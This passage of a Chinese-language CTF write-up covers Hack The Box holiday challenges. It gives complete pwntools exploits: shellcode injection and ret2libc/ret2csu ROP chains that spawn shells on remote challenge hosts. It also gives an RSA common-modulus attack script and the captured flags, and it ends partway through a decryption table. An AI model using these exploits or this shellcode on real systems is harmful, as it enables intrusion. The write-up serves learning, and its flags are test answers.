<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    p = remote(<span class="string">&#x27;46.101.39.71&#x27;</span>,<span class="number">31766</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./sleigh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;sleigh: [&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;]&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(addr))</span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">payload = shellcode + (<span class="number">72</span>-<span class="built_in">len</span>(shellcode))*<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">payload += p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/td9IyUcJYKhp8T4.png" alt="image"></p>
<p>flag: <code>HTB&#123;d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!&#125;</code></p>
<hr>
<h3 id="Naughty-list"><a href="#Naughty-list" class="headerlink" title="Naughty_list"></a>Naughty_list</h3><p>栈溢出程序，漏洞点：</p>
<p><img src="https://s2.loli.net/2022/01/02/SwDLYfBdExAH1rn.png" alt="image"></p>
<p>提供libc和程序，题目环境为ubuntu18.04，注意栈对齐：</p>
<p><img src="https://s2.loli.net/2022/01/02/n82mUgNQtFfKHBP.png" alt="image"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./naughty_list&#x27;</span></span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line">e = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    p = remote(<span class="string">&#x27;134.209.186.58&#x27;</span>,<span class="number">30928</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line">get_descr = <span class="number">0x4013AF</span></span><br><span class="line">put_got = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000401443</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400756</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload1 = padding + p64(pop_rdi)+p64(read_plt)+p64(put_got)+p64(get_descr)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x889</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0x13c</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0xec</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x3b8</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(addr))</span><br><span class="line">libc_base = addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = <span class="number">0x4F550</span>+libc_base</span><br><span class="line">bin_sh_str = libc_base + <span class="number">0x1B3E1A</span></span><br><span class="line">pause()</span><br><span class="line">payload2 = padding + p64(ret_addr)+p64(pop_rdi)+p64(bin_sh_str)+p64(system_addr)+p64(<span class="number">0</span>) //注意对齐</span><br><span class="line">p.recv(<span class="number">0x355</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0x13c</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ck&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">0xec</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x3b8</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/d1zbyHoj9UMilh3.png" alt="image"></p>
<p>flag: <code>HTB&#123;u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft&#125;</code></p>
<hr>
<h3 id="Minimelfistic"><a href="#Minimelfistic" class="headerlink" title="Minimelfistic"></a>Minimelfistic</h3><p>程序存在栈溢出，在泄露libc地址的时候，调用<code>sleep</code> 函数，会把程序的<code>rdx</code> 置为0，使用rop调用write函数无法输出内容。因此使用ret2csu泄露libc：<a href="https://www.anquanke.com/post/id/205858">ret2libc</a></p>
<p>漏洞点：</p>
<p><img src="https://s2.loli.net/2022/01/02/SRAvNJ6lzIj2WOg.png" alt="image"></p>
<p>csu:</p>
<p><img src="https://s2.loli.net/2022/01/02/nNyB7dm6qCl5VIo.png" alt="image"></p>
<p>csu利用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">log.success(<span class="string">&quot;csu_end_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_end_addr)))</span><br><span class="line">log.success(<span class="string">&quot;csu_front_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_front_addr)))</span><br><span class="line">log.success(<span class="string">&quot;write_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span class="line">log.success(<span class="string">&quot;read_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.success(<span class="string">&quot;main_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">log.success(<span class="string">&quot;bss_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss_base)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> </span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<p>利用exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./minimelfistic&#x27;</span></span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    p = remote(<span class="string">&#x27;188.166.174.81&#x27;</span>,<span class="number">31482</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main_addr = 0x4008D9</span></span><br><span class="line"><span class="comment"># write_plt = e.plt[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># write_got = e.got[&#x27;write&#x27;]</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a43</span></span><br><span class="line"><span class="comment"># pop_rsi_r15 = 0x0000000000400a41</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400616</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4008D9</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">csu_end_addr= <span class="number">0x400A3A</span></span><br><span class="line">csu_front_addr = <span class="number">0x400A20</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;csu_end_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_end_addr)))</span><br><span class="line">log.success(<span class="string">&quot;csu_front_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_front_addr)))</span><br><span class="line">log.success(<span class="string">&quot;write_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span class="line">log.success(<span class="string">&quot;read_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.success(<span class="string">&quot;main_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">log.success(<span class="string">&quot;bss_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss_base)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> </span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;9&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload1 = padding + csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;d!\n&#x27;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;write_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line">libc_base = addr-<span class="number">0x110210</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">system_addr = libc_base + <span class="number">0x4F550</span></span><br><span class="line">bin_str = libc_base + <span class="number">0x1B3E1A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 = padding + csu(0, 1, read_got, 0, bss_base, 0x100, main_addr)</span></span><br><span class="line"><span class="comment"># log.success(&quot;sending payload2 ---&gt;&quot;)</span></span><br><span class="line"><span class="comment"># p.sendline(payload2)</span></span><br><span class="line"><span class="comment"># log.success(&quot;sending payload3 ---&gt;&quot;)</span></span><br><span class="line"><span class="comment"># payload3 = b&#x27;/bin/shx00&#x27;</span></span><br><span class="line"><span class="comment"># payload3 += p64(system_addr)</span></span><br><span class="line"><span class="comment"># p.sendline(payload3)</span></span><br><span class="line"><span class="comment"># log.success(&quot;sending payload4 ---&gt;&quot;)</span></span><br><span class="line"><span class="comment"># payload3 = padding + csu(0, 1, bss_base+8, bss_base, 0, 0, main_addr)</span></span><br><span class="line"><span class="comment"># p.sendline(payload3)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line">payload2 = padding + p64(ret_addr)+p64(pop_rdi)+p64(bin_str)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/5FzNDIYJOnLXw26.png" alt="image"></p>
<p>flag:<code>HTB&#123;S4nt4_15_n0w_r34dy_t0_g1v3_s0m3_g1ft5&#125;</code></p>
<h3 id="Music-Notes"><a href="#Music-Notes" class="headerlink" title="Music Notes"></a>Music Notes</h3><hr>
<h2 id="Crypt"><a href="#Crypt" class="headerlink" title="Crypt"></a>Crypt</h2><h3 id="Common-Mistake"><a href="#Common-Mistake" class="headerlink" title="Common Mistake"></a>Common Mistake</h3><p>共模攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 欧几里得算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="comment"># &#123;&#x27;n&#x27;: &#x27;0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef&#x27;, &#x27;e&#x27;: &#x27;0x10001&#x27;, &#x27;ct&#x27;: &#x27;0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874&#x27;&#125;</span></span><br><span class="line"><span class="comment"># &#123;&#x27;n&#x27;: &#x27;0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef&#x27;, &#x27;e&#x27;: &#x27;0x23&#x27;, &#x27;ct&#x27;: &#x27;0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208&#x27;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  n = <span class="number">0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef</span></span><br><span class="line">  c1 = <span class="number">0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874</span></span><br><span class="line">  c2 = <span class="number">0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208</span></span><br><span class="line">  e1 = <span class="number">0x10001</span></span><br><span class="line">  e2 = <span class="number">0x23</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line">  <span class="built_in">print</span>((m))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
<h3 id="XMAS-Spirit"><a href="#XMAS-Spirit" class="headerlink" title="XMAS Spirit"></a>XMAS Spirit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./encrypted.bin&#x27;</span>, <span class="string">&#x27;rb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  enc = f.read()</span><br><span class="line"><span class="comment"># for i in enc:</span></span><br><span class="line"><span class="comment">#   print(i)</span></span><br><span class="line">table = &#123;</span><br><span class="line"><span class="number">160</span> : <span class="number">0</span>,<span class="number">73</span> : <span class="number">1</span>,<span class="number">242</span> : <span class="number">2</span>,<span class="number">155</span> : <span class="number">3</span>,<span class="number">68</span> : <span class="number">4</span>,<span class="number">237</span> : <span class="number">5</span>,<span class="number">150</span> : <span class="number">6</span>,<span class="number">63</span> : <span class="number">7</span>,<span class="number">232</span> : <span class="number">8</span>,<span class="number">145</span> : <span class="number">9</span>,<span class="number">58</span> : <span class="number">10</span>,<span class="number">227</span> : <span class="number">11</span>,<span class="number">140</span> : <span class="number">12</span>,<span class="number">53</span> : <span class="number">13</span>,<span class="number">222</span> : <span class="number">14</span>,<span class="number">135</span> : <span class="number">15</span>,<span class="number">48</span> : <span class="number">16</span>,<span class="number">217</span> : <span class="number">17</span>,<span class="number">130</span> : <span class="number">18</span>,<span class="number">43</span> : <span class="number">19</span>,<span class="number">212</span> : <span class="number">20</span>,<span class="number">125</span> : <span class="number">21</span>,<span class="number">38</span> : <span class="number">22</span>,<span class="number">207</span> : <span class="number">23</span>,<span class="number">120</span> : <span class="number">24</span>,<span class="number">33</span> : <span class="number">25</span>,<span class="number">202</span> : <span class="number">26</span>,<span class="number">115</span> : <span class="number">27</span>,<span class="number">28</span> : <span class="number">28</span>,<span class="number">197</span> : <span class="number">29</span>,<span class="number">110</span> : <span class="number">30</span>,<span class="number">23</span> : <span class="number">31</span>,<span class="number">192</span> : <span class="number">32</span>,<span class="number">105</span> : <span class="number">33</span>,<span class="number">18</span> : <span class="number">34</span>,<span class="number">187</span> : <span class="number">35</span>,<span class="number">100</span> : <span class="number">36</span>,<span class="number">13</span> : <span class="number">37</span>,<span class="number">182</span> : <span class="number">38</span>,<span class="number">95</span> : <span class="number">39</span>,<span class="number">8</span> : <span class="number">40</span>,<span class="number">177</span> : <span class="number">41</span>,<span class="number">90</span> : <span class="number">42</span>,<span class="number">3</span> : <span class="number">43</span>,<span class="number">172</span> : <span class="number">44</span>,<span class="number">85</span> : <span class="number">45</span>,<span class="number">254</span> : <span class="number">46</span>,<span class="number">167</span> : <span class="number">47</span>,<span class="number">80</span> : <span class="number">48</span>,<span class="number">249</span> : <span class="number">49</span>,<span class="number">162</span> : <span class="number">50</span>,<span class="number">75</span> : <span class="number">51</span>,<span class="number">244</span> : <span class="number">52</span>,<span class="number">157</span> : <span class="number">53</span>,<span class="number">70</span> : <span class="number">54</span>,<span class="number">239</span> : <span class="number">55</span>,<span class="number">152</span> : <span class="number">56</span>,<span class="number">65</span> : <span class="number">57</span>,<span class="number">234</span> : <span class="number">58</span>,<span class="number">147</span> : <span class="number">59</span>,<span class="number">60</span> : <span class="number">60</span>,<span class="number">229</span> : <span class="number">61</span>,<span class="number">142</span> : <span class="number">62</span>,<span class="number">55</span> : <span class="number">63</span>,<span class="number">224</span> : <span class="number">64</span>,<span class="number">137</span> : <span class="number">65</span>,<span class="number">50</span> : <span class="number">66</span>,<span class="number">219</span> : <span class="number">67</span>,<span class="number">132</span> : <span class="number">68</span>,<span class="number">45</span> : <span class="number">69</span>,<span class="number">214</span> : <span class="number">70</span>,<span class="number">127</span> : <span class="number">71</span>,<span class="number">40</span> : <span class="number">72</span>,<span class="number">209</span> : <span class="number">73</span>,<span class="number">122</span> : <span class="number">74</span>,<span class="number">35</span> : <span class="number">75</span>,<span class="number">204</span> : <span class="number">76</span>,<span class="number">117</span> : <span class="number">77</span>,<span class="number">30</span> : <span class="number">78</span>,<span class="number">199</span> : <span class="number">79</span>,<span class="number">112</span> : <span class="number">80</span>,<span class="number">25</span> : <span class="number">81</span>,<span class="number">194</span> : <span class="number">82</span>,<span class="number">107</span> : <span class="number">83</span>,<span class="number">20</span> : <span class="number">84</span>,<span class="number">189</span> : <span class="number">85</span>,<span class="number">102</span> : <span class="number">86</span>,<span class="number">15</span> : <span class="number">87</span>,<span class="number">184</span> : <span class="number">88</span>,<span class="number">97</span> : <span class="number">89</span>,<span class="number">10</span> : <span class="number">90</span>,<span class="number">179</span> : <span class="number">91</span>,<span class="number">92</span> : <span class="number">92</span>,<span class="number">5</span> : <span class="number">93</span>,<span class="number">174</span> : <span class="number">94</span>,<span class="number">87</span> : <span class="number">95</span>,<span class="number">0</span> : <span class="number">96</span>,<span class="number">169</span> : <span class="number">97</span>,<span class="number">82</span> : <span class="number">98</span>,<span class="number">251</span> : <span class="number">99</span>,<span class="number">164</span> : <span class="number">100</span>,<span class="number">77</span> : <span class="number">101</span>,<span class="number">246</span> : <span class="number">102</span>,<span class="number">159</span> : <span class="number">103</span>,<span class="number">72</span> : <span class="number">104</span>,<span class="number">241</span> : <span class="number">105</span>,<span class="number">154</span> : <span class="number">106</span>,<span class="number">67</span> : <span class="number">107</span>,<span class="number">236</span> : <span class="number">108</span>,<span class="number">149</span> : <span class="number">109</span>,<span class="number">62</span> : <span class="number">110</span>,<span class="number">231</span> : <span class="number">111</span>,<span class="number">144</span> : <span class="number">112</span>,<span class="number">57</span> : <span class="number">113</span>,<span class="number">226</span> : <span class="number">114</span>,<span class="number">139</span> : <span class="number">115</span>,<span class="number">52</span> : <span class="number">116</span>,<span class="number">221</span> : <span class="number">117</span>,<span class="number">134</span> : <span class="number">118</span>,<span class="number">47</span> : <span class="number">119</span>,<span class="number">216</span> : <span class="number">120</span>,<span class="number">129</span> : <span class="number">121</span>,<span class="number">42</span> : <span class="number">122</span>,<span class="number">211</span> : <span class="number">123</span>,<span class="number">124</span> : <span class="number">124</span>,<span class="number">37</span> : <span class="number">125</span>,<span class="number">206</span> : <span class="number">126</span>,<span class="number">119</span> : <span class="number">127</span>,<span class="number">32</span> : <span class="number">128</span>,<span class="number">201</span> : <span class="number">129</span>,<span class="number">114</span> : <span class="number">130</span>,<span class="number">27</span> : <span class="number">131</span>,<span class="number">196</span> : <span class="number">132</span>,<span class="number">109</span> : <span class="number">133</span>,<span class="number">22</span> : <span class="number">134</span>,<span class="number">191</span> : <span class="number">135</span>,<span class="number">104</span> : <span class="number">136</span>,<span class="number">17</span> : <span class="number">137</span>,<span class="number">186</span> : <span class="number">138</span>,<span class="number">99</span> : <span class="number">139</span>,<span class="number">12</span> : <span class="number">140</span>,<span class="number">181</span> : <span class="number">141</span>,<span class="number">94</span> : <span class="number">142</span>,<span class="number">7</span> : <span class="number">143</span>,<span class="number">176</span> : <span class="number">144</span>,<span class="number">89</span> : <span class="number">145</span>,<span class="number">2</span> : <span class="number">146</span>,<span class="number">171</span> : <span class="number">147</span>,<span class="number">84</span> : <span class="number">148</span>,<span class="number">253</span> : <span class="number">149</span>,<span class="number">166</span> : <span class="number">150</span>,<span class="number">79</span> : <span class="number">151</span>,<span class="number">248</span> : <span class="number">152</span>,<span class="number">161</span> : <span class="number">153</span>,<span class="number">74</span> : <span class="number">154</span>,<span 